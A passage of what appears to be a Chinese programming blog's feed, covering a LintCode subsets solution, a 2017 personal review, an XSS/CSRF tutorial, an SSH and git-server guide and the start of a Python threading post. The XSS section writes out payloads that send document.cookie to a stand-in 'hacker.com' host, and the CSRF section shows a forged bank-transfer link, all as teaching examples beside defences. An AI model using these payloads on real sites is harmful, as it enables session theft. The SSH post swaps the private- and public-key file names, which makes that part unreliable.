     <span class="keyword">return</span> results; <span class="comment">// 空列表</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// BFS</span></span><br><span class="line">        Queue&lt;List&lt;Integer&gt;&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        queue.offer(<span class="keyword">new</span> LinkedList&lt;Integer&gt;());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            List&lt;Integer&gt; subset = queue.poll();</span><br><span class="line">            results.add(subset);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (subset.size() == <span class="number">0</span> || subset.get(subset.size() - <span class="number">1</span>) &lt; nums[i]) &#123;</span><br><span class="line">                    List&lt;Integer&gt; nextSubset = <span class="keyword">new</span> LinkedList&lt;Integer&gt;(subset);</span><br><span class="line">                    nextSubset.add(nums[i]);</span><br><span class="line">                    queue.offer(nextSubset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="奇淫巧技"><a href="#奇淫巧技" class="headerlink" title="奇淫巧技"></a>奇淫巧技</h2><p>还有一些很巧妙的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    @param: nums: A set of numbers</span></span><br><span class="line"><span class="string">    @return: A list of lists</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subsets</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="comment"># write your code here</span></span><br><span class="line">        result = [[]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sorted(nums):</span><br><span class="line">            result = result + [item + [i]  <span class="keyword">for</span> item <span class="keyword">in</span> result]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>eg: nums = [1, 2, 3]<br>初始化result = [ [] ]<br>第一次循环 result = [ [], [1] ]<br>第二次循环 result = [ [], [1], [2], [1,2] ]<br>第三次循环 result = [ [], [1], [2], [1,2], [3], [1,3], [2, 3], [1,2,3]]</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017年度总结]]></title>
      <url>/2018/01/01/Life/2017%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="2017年度总结"><a href="#2017年度总结" class="headerlink" title="2017年度总结"></a>2017年度总结</h2><p>2017年已经远去，回想这一年，是有些平淡但又充实的一年，在纠结和不安中也算是完成了一些事情。</p>
<ol>
<li><p>从年初的迷茫无措，幻想自己还是有可能保研，到寒假内心无数次斗争慢慢坚定自己去香港读研的决定。这一步或许是高考之后对我的人生影响最大的一个选择了吧，是不是最优的选择我并不知道，但是我知道的是不管哪一条路都难免会有荆棘，安心走下去，勿羡旁人，才是一个好的心态。一个人的朝圣路，甘苦自知。</p>
</li>
<li><p>5月1日的21岁生日，和三个朋友履行黄山的阅读。他们三个对我来说，已经不是普通的朋友，而是那种我想混的好一点 让他们也为我开心的知己。不事先计划、随性自由的自驾行，宁静、自然的茶山，静谧的宏村，都是最美的回忆呀。</p>
</li>
<li><p>5月末，找到了第一份实习-览众科技。 在这里第一次真正了解了git的用法，学习了一些写代码的技巧和规范，培养了一些代码洁癖 = =，有了可以往简历上写的经历，也认识到了自己原来还有那么多的不足。学校、学历并不能算得了什么，在互联网领域，能力才是最重要的。而这个能力，不是指你会多少语言、刷了多少题，而是你快速解决问题的能力，这个能力并不是嘴上说说就能完成的，而是需要有很扎实的基础，对计算机很深刻的理解，才能掌握所谓的<em>快速解决问题</em>的能力。如果遇到问题只是一味的百度 Google去查解决方案，而不深入地去想问题为什么会发生，找解决问题的根本原理，那终究只是一个二流程序猿，换句话说 当你的核心竞争力源自你比别人多几次google时（多搬过几块砖），总会被新的年轻的程序猿取代的。 所以归根结底，思考、深入问题、发现问题的本质，才是一个程序猿最需要的东西。 至少现在我是这么想的= = 不知道以后会不会来打脸。</p>
</li>
<li><p>7月8月减肥计划又一次因为回家而中断= = </p>
</li>
<li><p>9月，GRE考试结束，至此托福和GRE都考出了我自己比较满意的分数吧。而且学托福期间确实喜欢上了听英语听力，哈哈。 </p>
</li>
<li><p>9月到12月，漫长的申请季，原本自信9月2日的提前批面试，到后来杳无音信，逐步消磨着我的自信和耐心。开始有些焦虑，开始考虑香港港中科之外的学校、开始考虑新加坡 加拿大的学校。看着周围保研的朋友开始放松，自己只能把这些复杂的感情放在心里，只等着Offer来的那一天，再把这个心结打开。直到12月的某个晚上，港科的老师突然回复邮件说同意收我为学生，申请季算是口头结束了吧。我一直觉得，考研、申请难就难在没有人作伴，不像高考所有人都在为了同一个目标奋斗，大家并肩作战，而如今只能各自为战，看有的人已经确定了未来去向的，自己却只能继续坚持。所以真的祝福所有考研、出国、工作的朋友都能如愿以偿。 还是那句话，一个人的朝圣路，甘苦自知，不必悲伤或心急。</p>
</li>
<li><p>11月到12月，到了百度实习。因为不是百度的核心部门吧，过得不是很开心，但还是感谢组里为我提供帮助的人。就算只有两个多月，以后说起来也是我度。 我度加油呀，重振雄风哈。</p>
</li>
</ol>
<p>最后啊，给2018立一些flag吧 </p>
<ul>
<li>减肥成功哟 125斤</li>
<li>找到合适的小伙伴和我一起毕业旅行，云南</li>
<li>读书读书，读<em>20+</em>本书</li>
<li>和朋友用力道别，纪念珍贵的大学四年</li>
<li>练一练Guitar</li>
<li>组织班上同学一起出去毕业旅行</li>
<li>到香港的前半年过得不错</li>
</ul>
<p>Hello 2018，愿各位新的一年，所得皆所愿，所遇皆所爱。</p>
]]></content>
      
        
        <tags>
            
            <tag> Life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss csrf攻击与防御]]></title>
      <url>/2017/12/28/XSS&amp;CRSF%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
<p>Cross-site scripting(XSS) is when an attacker can inject scripts into a page sent by your server. Browsers treat these injected scripts like any other script in the page.</p>
</blockquote>
<a id="more"></a>
<h2 id="什么是XSS攻击"><a href="#什么是XSS攻击" class="headerlink" title="什么是XSS攻击"></a>什么是XSS攻击</h2><p><img src="https://www.incapsula.com/images/illustrations/web-app-security-mini-site/sorted-XSS.png" alt="Image result for XSS"></p>
<p>XSS跨站脚本攻击是指攻击者向web页面中插入恶意的script代码, 从而将用户的一些隐私数据比如cookies, session发送给攻击者。 恶意代码一般是javascript，也可以包含html, flash等。</p>
<p>举一个简单的例子，比如搜索页面中的输入框是</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"keyword"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"keyword"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其url是<code>http://mysite.com?q=&lt;keyword&gt;</code>那么我们就可以通过输入以下的内容来进行攻击:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">somekeyword&lt;script type=&quot;text/javascript&quot;&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这样就可以把用户的cookies信息打印出来。 进一步如果想获取用户的cookies，把他们发送到自己的服务器上，就可以使用下面的方法：将以下url发送到给该网站的用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mysite.com?q=NBA&lt;script type=&apos;text/javascript&apos; src=&quot;http://hacker.com/steal.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>对NBA感兴趣的用户就会打开这个连接，这样该网站就会加载hacker的steal.js文件，在这个文件中就可以获取用户的cookies，session等信息并发送到hacker服务器上。但是由于浏览器的<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">同源策略</a>限制，A网页设置的cookie，B网页不能使用。 这个时候可以利用img标签，因为同源策略并不限制img标签。 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
<p>只要这段代码被执行用户的cookies就会发送到黑客的服务器上.</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol>
<li>Stored XSS Attacks<br> The injected script is stored permanently on the target servers. The victim then retrieves this malicious script from the server when the browser sends a request for data. 这种攻击的注入脚本存在于目标服务器上，比如说twitter网站，如果hacker可以发布一条包含html标签的动态，而服务器并不会过滤它的时候，就会受到这种攻击。黑客可以发布一条动态：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Happy new year! &lt;script src=&quot;http://hacker.com/stealer.js&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这样任何一个刷到这条动态的用户都会执行这个脚本，他们的cookies就会被盗</p>
<ol>
<li><p>Reflected XSS Attacks<br> Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a “trusted” server.<br> 上一个section的例子就属于这种攻击，这中攻击需要黑客把链接挂在别的网站上或者email中诱导别的用户取点击</p>
</li>
<li><p>Dom-based XSS Attacks<br> The payload is executed as a result of modifying the DOM environment (in the victim’s browser) used by the original client-side script. That is, the page itself does not change, but the client side code contained in the page runs in an unexpected manner because of the malicious modifications to the DOM environment.<br> e.g.: <a href="https://www.acunetix.com/blog/articles/dom-xss-explained/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/dom-xss-explained/</a></p>
</li>
</ol>
<h2 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h2><ul>
<li>严格限制用户输入，最好不要让用户输入带标签的内容</li>
<li>严格过滤用户的输入，比如使用Python的<code>cgi.escape()</code> 这里escape的意思是转义，比如把<code>&amp; 《 》 &quot; ,</code>分别转移成<code>&amp;amp &amp;lt &amp;gt &amp;quot &amp;#39</code></li>
<li>限制cookies的过期时间</li>
</ul>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><blockquote>
<p>Cross-Site Request Forgery (<strong>CSRF</strong>) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated.</p>
</blockquote>
<h2 id="什么是CSRF攻击"><a href="#什么是CSRF攻击" class="headerlink" title="什么是CSRF攻击"></a>什么是CSRF攻击</h2><p>  <img src="https://hydrasky.com/wp-content/uploads/2016/08/cross_site_request_forger_1.png.jpg" alt="Image result for CSRF"><br>从这幅图中可以很清楚的看到CSRF的原理，假设你先用浏览器打开了中国银行的网站并登录，这时你的浏览器中已经存储了icbc.com的cookie，如果这个时候你有打开了一个网站 hacker.com。 而这个网站中包含恶意代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"www.icbc.com/transfer?toBankId=hacker&amp;money=100"</span>&gt;</span>恭喜你获得一部iPhoneX，快来领取吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样如果用户点击了这个连接，一次转账操作就神不知鬼不觉的发生了。因为浏览器存有icbc.com合法的cookie</p>
<h2 id="如何避免-1"><a href="#如何避免-1" class="headerlink" title="如何避免"></a>如何避免</h2><h3 id="1-Synchronizer-token-pattern"><a href="#1-Synchronizer-token-pattern" class="headerlink" title="1. Synchronizer token pattern"></a>1. Synchronizer token pattern</h3><p>利用CSRF token来防御csrf攻击， csrf token有以下几种特点</p>
<ul>
<li>unique per user session</li>
<li>large random value</li>
<li>generated by a cryptographically secure random number generator</li>
</ul>
<p>当web application发起request之前的位置加一个隐藏的input域</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/transfer.do"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"CSRFToken"</span> <span class="attr">value</span>=<span class="string">"OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWE..."</span>&gt;</span></span><br><span class="line"> …</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器端受到该请求后会验证这个CSRFtoken是否存在且正确（根据session找到服务器端存储的对应token），如果不正确则会认为可能是受到了一次csrf攻击。</p>
<h3 id="2-token-cookie"><a href="#2-token-cookie" class="headerlink" title="2. token + cookie"></a>2. token + cookie</h3><p>这种方法是<a href="https://djangobook.com/csrf-methods-utilities/" target="_blank" rel="noopener">django采用的</a></p>
<p>首先设置CSRF cookie，这是一个由CsrfViewMidlleware决定的值（通过sessionid生成一个特定的secret值加上随机的扰动）， 用户每次登录这个值都不同。 然后再所有的POST表单中设置一个隐藏的form field名为 <code>csrfmiddlewaretoken</code> 该字段的值也是secret加上随机扰动，每次response中的扰动都不同，所以每次刷新浏览器你都会发现<code>csrfmiddlewaretoken</code>值变了。</p>
<p>这样对于每一个HTTP请求（除GET HEAD OPTIONS TRACE这些安全的方法之外），每次requests 服务器都会检查是否有csrf cookie，然后在检查<code>csrfmiddlewaretoken</code>值是否正确，如果二者有一个不正确就会返回403。验证<code>csrfmiddlewaretoken</code>时只会验证去掉随机扰动之后得值。 这样就可以有效的预防CRSF攻击，因为攻击者虽然可以利用已经登录的网站的cookie，却并不可以获取到<code>csrfmiddlewaretoken</code>，所以就不能登录目标网站。</p>
<p><img src="http://maxprog.net.pl/wp-content/uploads/2016/05/CSRF_UX.png" alt="Image result for CSRF"></p>
<p>实测：<br>第一次访问login页面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># request:</span><br><span class="line">GET /login HTTP/1.1</span><br><span class="line"></span><br><span class="line"># response:</span><br><span class="line">HTTP/1.0 200 OK </span><br><span class="line">Date: Thu, 28 Dec 2017 09:29:58 GMT </span><br><span class="line">Server: WSGIServer/0.2 CPython/3.4.5 </span><br><span class="line">Content-Type: text/html; </span><br><span class="line">charset=utf-8 </span><br><span class="line">Vary: Cookie </span><br><span class="line">X-Frame-Options: SAMEORIGIN </span><br><span class="line">Set-Cookie: csrftoken=TknlhiDQaC2ZZtyJRxwfz4265m5mH890SZcK0QN5S0RS4D1Wu8eY6todaEJ2pprl; expires=Thu, 27-Dec-2018 09:29:58 GMT; Max-Age=31449600; Path=/</span><br></pre></td></tr></table></figure>
<p>根据set-cookie字段，浏览器将<code>csrftoken</code>这个cookie保存在这个网址目录下，返回的页面源代码中form表单有这么一项（每次刷新浏览器都会发现这个值是一直在变化的）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;csrfmiddlewaretoken&apos; value=&apos;k3PYp5nHdVlCeYLPS8cboQ0sgfNIKrj6jIEn8DxWVjavj8e2vJUUVfmzlxrosIBr&apos; /&gt;</span><br></pre></td></tr></table></figure>
<p>但是这个时候csrftoken和csrfmiddlewaretoken都是没有用的，因为用户还没有登录，两个值并没有和session关联起来。然后输入username和password点击登录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># request</span><br><span class="line">POST /login  HTTP/1.1 </span><br><span class="line">data: &#123;</span><br><span class="line">	&quot;username&quot;: &quot;xxx&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;xxx&quot;,</span><br><span class="line">	&quot;csrfmiddlewaretoken&quot;: &quot;&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">Set-Cookie: csrftoken=OQyI1daHFy6s2oYCRFw7vzWJVVqvRWpdG8qdm0cUNqcMt4P9jdhKcxogtxRxGvTA; expires=Thu, 27-Dec-2018 09:40:10 GMT; Max-Age=31449600; Path=/</span><br><span class="line">Set-Cookie: sessionid=qhazgcpmkpum8neurg4ukh2ua4b90pff; expires=Thu, 11-Jan-2018 09:40:10 GMT; HttpOnly; Max-Age=1209600; Path=/</span><br></pre></td></tr></table></figure></p>
<p>登录成功，用户完成了登录，可以看到设置了csrftoken和sessionid的cookie。此后再做别的操作都会加上这两个cookie</p>
<p>一些有趣的操作：</p>
<p>在一个浏览器中打开两个tab，都打开同一个网站，例如<a href="http://lintcode.com/accounts/signin/" target="_blank" rel="noopener">http://lintcode.com/accounts/signin/</a> 在其中一个tab上先登录，再在第二个tab上点登录，你会得到csrf failed</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting</a></p>
<p><a href="https://docs.djangoproject.com/en/dev/ref/csrf/#how-it-works" target="_blank" rel="noopener">https://docs.djangoproject.com/en/dev/ref/csrf/#how-it-works</a></p>
]]></content>
      
        
        <tags>
            
            <tag> xss </tag>
            
            <tag> csrf </tag>
            
            <tag> django </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ssh原理与应用]]></title>
      <url>/2017/12/22/ssh%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="ssh原理与应用"><a href="#ssh原理与应用" class="headerlink" title="ssh原理与应用"></a>ssh原理与应用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="What-什么是ssh"><a href="#What-什么是ssh" class="headerlink" title="What 什么是ssh"></a>What 什么是ssh</h3><p>Secure Shell(SSH) is a cryptographic network protocal for operating network services securely over an unsecured network. The best known example application is for remote login to computer system by users.<br><a id="more"></a></p>
<h2 id="ssh远程登录"><a href="#ssh远程登录" class="headerlink" title="ssh远程登录"></a>ssh远程登录</h2><p>在客户端来看，SSH提供两种级别的安全验证</p>
<h3 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h3><p>基于账号密码的登录方式。client想要登陆时，server会把自己的公钥发给client, 然后client用这个公钥加密自己的账号和密码发回给server，server再用自己的密钥去解开这个账号密码判断是否正确。但是这个过程中有可能会由别的服务器冒充真正想要访问的服务器，将伪造的公钥发给用户（因为SSH协议的公钥是没有证书中心CA公正的，所以用户难以判别真伪），然后便可以截获用户的账号密码，即中间人攻击。 所以当采用口令登录的时候，第一次尝试登录时会提示<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host 'host (12.18.429.21)' can't be established.</span><br><span class="line">RSA key fingerprint is 8:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure></p>
<p>意思是无法确保该host主机的真实性，需要用户自己判断是不是真正的远程主机。如果你同意了（如果是假冒的主机，那你就受到了中间人的青睐），会提示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: Permanently added <span class="string">'host,12.18.429.21'</span> (RSA) to the list of known hosts.</span><br><span class="line">git@&lt;server_ip&gt;<span class="string">'s password:</span></span><br></pre></td></tr></table></figure>
<p>之后会要求输入账号密码来登录。然后你可以在client本地的.ssh文件夹中看到known_hosts这个文件，其中存放了所有被接受的远程主机的公钥，下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<h3 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h3><p>公钥登录方式以<strong>非对称加密</strong>实现身份验证。client需要为自己创建一对公钥&amp;密钥，并将自己的公钥放在server上(<code>.ssh/authorized_keys</code>文件夹下)，而密钥放在自己本地。每次登录时server会向client发送一个随机字符串，client需要用自己的密钥对这个随机字符串进行加密，然后发回给server。 server用公钥解开该密文，如果与原先发送的相匹配，则证明该用户是可信的。可以<strong>直接登录shell，不再要求密码</strong>。 这种方式便无法被中间人攻击，因为server无法获取client的密钥。 这种方式第一次登录适合也会提示<code>The authenticity of host &#39;host (12.18.429.21)&#39; can&#39;t be established.</code> 需要你确认host主机的真实性。但是这种方法不会收到中间人攻击是因为</p>
<p>对于服务端来说</p>
<p>第一种方案中主机将自己的公钥发放给相关客户端，客户端在访问主机时使用该主机的公钥来加密数据，主机则使用自己的私钥来解密数据，从而实现主机密钥认证，确保数据的保密性。 在第二张方案中，存在一个密钥认证中心，所有提供服务的主机都将自己的公开密钥提交给认证中心，而作为客户端的主机只需要保存一份认证中心的公开密钥就可以了，这种模式下客户端必须访问认证中心然后才能访问服务器主机。</p>
<h2 id="ssh应用"><a href="#ssh应用" class="headerlink" title="ssh应用"></a>ssh应用</h2><h3 id="搭建git服务器"><a href="#搭建git服务器" class="headerlink" title="*搭建git服务器"></a>*搭建git服务器</h3><blockquote>
<p>做了个小实验， 在ubuntu上搭建了一个git服务器，加深对ssh的理解</p>
</blockquote>
<p>首先明确几个比较重要的的文件</p>
<ul>
<li>authorized_keys: 已经认证的客户端的公钥</li>
<li>known_host: 已经确保正常、可以安全连接的服务器的公钥</li>
<li>id_rsa: 公钥</li>
<li>id_rsa.pub: 私钥</li>
</ul>
<p>以下是具体操作步骤</p>
<ol>
<li>在服务器（Ubuntu）上安装git: <code>sudo apt-get install git</code></li>
<li>创建一个git用户用来运行git服务: <code>sudo adduser git</code></li>
<li>创建证书登录:   收集需要登录的用户的公钥（<code>id_rsa.pub</code> 可使用ssh-keygen来生成），把公钥导入到/home/git/.ssh/authorized_keys 文件中，如果不存在.ssh文件夹的话需要创建一个</li>
<li>初始化git仓库: 选定一个目录作为git仓库 例如在/home/ubuntu下执行<code>sudo git init --bare sample.git</code>,  Git就会创建一个名为sample.git的文件夹, 也是一个裸仓库，<strong>裸仓库没有工作区</strong>，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以<code>.git</code>结尾。然后，把owner改为<code>git</code>：<code>sudo chown -R git:git sample.git</code></li>
<li>禁用shell登录: 处于安全考虑, 创建的git用户不允许登录shell，这可以通过编辑<code>/etc/passwd</code>文件完成。找到类似下面的一行<code>git:x:1001:1001:,,,:/home/git:/bin/bash</code> 改为<code>git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell</code> 这样，<code>git</code>用户可以正常通过ssh使用git，但无法登录shell，因为我们为<code>git</code>用户指定的<code>git-shell</code>每次一登录就自动退出</li>
<li>这样就大功告成了，可以在客户端上使用<code>git clone git@server_ip:/home/ubuntu/sample.git</code>操作来克隆代码库（会提示是个空的库），之后就和正常的操作一样啦。 </li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.ssh.com/attack/man-in-the-middle" target="_blank" rel="noopener">https://www.ssh.com/attack/man-in-the-middle</a><br><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python多线程&多进程]]></title>
      <url>/2017/12/18/Python/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B_&amp;_%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="Python多线程-多进程"><a href="#Python多线程-多进程" class="headerlink" title="Python多线程 多进程"></a>Python多线程 多进程</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="进程（process）-程序是指令、数据及其组织形式的描述，进程是程序的真正运行实例。包含：（程序的可执行机器码、内存、资源的操作系统描述符、安全特性、处理器状态）等。"><a href="#进程（process）-程序是指令、数据及其组织形式的描述，进程是程序的真正运行实例。包含：（程序的可执行机器码、内存、资源的操作系统描述符、安全特性、处理器状态）等。" class="headerlink" title="进程（process）:  程序是指令、数据及其组织形式的描述，进程是程序的真正运行实例。包含：（程序的可执行机器码、内存、资源的操作系统描述符、安全特性、处理器状态）等。"></a>进程（process）:  程序是指令、数据及其组织形式的描述，进程是程序的真正运行实例。包含：（程序的可执行机器码、内存、资源的操作系统描述符、安全特性、处理器状态）等。</h3><blockquote>
<p>Each process provides the resources needed to execute a program. A process has a virtual address space, executable code, open handles to system objects, a security context, a unique process identifier, environment variables, a priority class, minimum and maximum working set sizes, and at least one thread of execution. Each process is started with a single thread, often called the primary thread, but can create additional threads from any of its threads.</p>
</blockquote>
<h3 id="线程（thread）-是操作系统能够进行运算调度的最小单元。被包含在进程之中，是进程中的实际运算单位。同一进程中的多条线程将共享该进程中的全部系统资源，如虚拟地址空间，文件描述符和信号处理等等。但同一进程中的多个线程有各自的调用栈（call-stack），自己的寄存器环境（register-context），自己的线程本地存储（thread-local-storage）"><a href="#线程（thread）-是操作系统能够进行运算调度的最小单元。被包含在进程之中，是进程中的实际运算单位。同一进程中的多条线程将共享该进程中的全部系统资源，如虚拟地址空间，文件描述符和信号处理等等。但同一进程中的多个线程有各自的调用栈（call-stack），自己的寄存器环境（register-context），自己的线程本地存储（thread-local-storage）" class="headerlink" title="线程（thread）: 是操作系统能够进行运算调度的最小单元。被包含在进程之中，是进程中的实际运算单位。同一进程中的多条线程将共享该进程中的全部系统资源，如虚拟地址空间，文件描述符和信号处理等等。但同一进程中的多个线程有各自的调用栈（call stack），自己的寄存器环境（register context），自己的线程本地存储（thread-local storage）"></a>线程（thread）: 是操作系统能够进行运算调度的最小单元。被包含在进程之中，是进程中的实际运算单位。同一进程中的多条线程将共享该进程中的全部系统资源，如虚拟地址空间，<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6" title="文件描述符" target="_blank" rel="noopener">文件描述符</a>和<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86" title="信号处理" target="_blank" rel="noopener">信号处理</a>等等。但同一进程中的多个线程有各自的<a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E7%94%A8%E6%A0%88" title="调用栈" target="_blank" rel="noopener">调用栈</a>（call stack），自己的寄存器环境（register context），自己的线程本地存储（thread-local storage）</h3><blockquote>
<p>A thread is an entity within a process that can be scheduled for execution. All threads of a process share its virtual address space and system resources. In addition, each thread maintains exception handlers, a scheduling priority, thread local storage, a unique thread identifier, and a set of structures the system will use to save the thread context until it is scheduled. The thread context includes the thread’s set of machine registers, the kernel stack, a thread environment block, and a user stack in the address space of the thread’s process. Threads can also have their own security context, which can be used for impersonating clients.</p>
</blockquote>
<a id="more"></a>
<p>这里还需要明确两个概念 并行和并发。 </p>
<h3 id="并行concurreny"><a href="#并行concurreny" class="headerlink" title="并行concurreny"></a>并行concurreny</h3><blockquote>
<p>when two or more tasks can start, run, and complete in overlapping time periods. It doesn’t necessarily mean they’ll ever both be running at the same instant. Eg. multitasking on a single-core machine.</p>
</blockquote>
